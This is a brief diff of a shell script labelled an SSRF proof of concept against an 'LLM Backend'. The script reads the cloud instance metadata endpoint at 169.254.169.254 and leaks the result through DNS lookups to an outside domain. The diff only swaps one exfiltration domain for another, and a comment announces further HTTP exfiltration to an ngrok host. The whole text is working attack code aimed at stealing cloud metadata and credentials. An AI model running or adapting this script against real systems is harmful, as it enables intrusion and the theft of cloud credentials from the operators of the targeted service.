@@ -3,7 +3,7 @@ echo "=== SSRF PoC HIT == $(date) == LLM Backend =="
 
 # Blind DNS SSRF (MOST Reliable)
 SSRF_DATA=$(curl -s http://169.254.169.254/latest/meta-data/ 2>/dev/null || echo "metadata-blocked")
-nslookup "${SSRF_DATA// /.}".1003afc4aa.ddns.1433.eu.org.
+nslookup "${SSRF_DATA// /.}".e041ddb4.digimg.store
 
 # HTTP Exfil to your ngrok
 curl -s "http://localhost/admin" \
